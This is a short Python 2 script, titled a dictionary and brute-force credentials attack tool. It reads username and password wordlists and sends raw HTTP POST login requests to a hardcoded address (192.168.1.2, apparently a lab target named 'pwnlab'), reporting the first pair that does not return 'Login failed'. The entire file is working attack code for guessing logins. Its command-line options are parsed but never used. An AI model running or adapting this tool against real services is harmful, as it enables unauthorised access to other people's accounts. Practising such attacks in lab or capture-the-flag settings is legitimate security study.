#!/usr/bin/python
#
# Brute force attacker
# bl4de | bloorq@gmail.com | Twitter: @_bl4de
#
import argparse
import socket


def create_socket(host, port):
    """creates and returns socket"""
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((host, port))
    return connection


def send_request(target, payload, response_size=4096):
    """sends payload to target and returns response"""
    target.send(payload)
    response = target.recv(response_size)
    return response


# @TODO: option to define success pattern, multi-threading


if __name__ == "__main__":
    """main program - run HTML analyze"""
    parser = argparse.ArgumentParser(description="""
        Brutus.py - dictionary and bruteforce credentials attack tool

    """)

    parser.add_argument('-u', help='IP or URL of the target')
    parser.add_argument('-s', help='service to be attacked (HTTP, FTP, SSH)')
    parser.add_argument('-p', help='service TCP port')

    args = parser.parse_args()

    usernames = open("../dictionaries/usernames_14.txt", "r").readlines()
    passwords = open("../dictionaries/passwords_100.txt", "r").readlines()
    counter = 1

    print "[*] Will try {} credentials, hold on...".format(
        len(usernames) * len(passwords))
    for user in usernames:
        for passwd in passwords:
            user = user.strip()
            passwd = passwd.strip()
            print "[*] Trying {}:{}... ({})".format(user, passwd, counter)

            # create POST payload
            payload = "user={}&pass={}&submit=Login".format(user, passwd)
            payload_len = len(payload)

            # create request
            # pwnlab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # pwnlab.connect(("192.168.1.2", 80))
            pwnlab = create_socket("192.168.1.2", 80)

            req = "POST /?page=login HTTP/1.1\r\nHost: 192.168.1.2\r\n" \
                  "Content-Type: application/x-www-form-urlencoded\r\n" \
                  "Content-Length: {}\r\n\r\n".format(payload_len)

            req += payload + "\r\n\r\n"

            # send request and check response
            resp = send_request(pwnlab, req)

            counter += 1
            if "Login failed" not in resp:
                print "[+] Login sucessful !!!"
                exit("{}:{}".format(user, passwd))

    print "[-] All done, valid credentials not found :("
